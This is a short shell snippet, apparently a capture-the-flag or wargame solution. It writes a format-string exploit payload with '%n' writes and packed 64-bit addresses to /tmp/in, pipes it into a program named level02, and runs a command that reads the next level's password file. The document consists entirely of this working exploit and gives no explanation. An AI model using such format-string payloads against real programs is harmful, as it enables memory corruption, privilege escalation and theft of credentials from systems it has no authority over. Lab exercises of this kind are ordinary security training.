echo -en "%8\$n%4196972d%9\$n\n\xe4\x11\x60\x00\x00\x00\x00\x00\xe0\x11\x60\x00\x00\x00\x00\x00\n" > /tmp/in
(cat /tmp/in; echo "cat /home/users/level03/.pass") | ./level02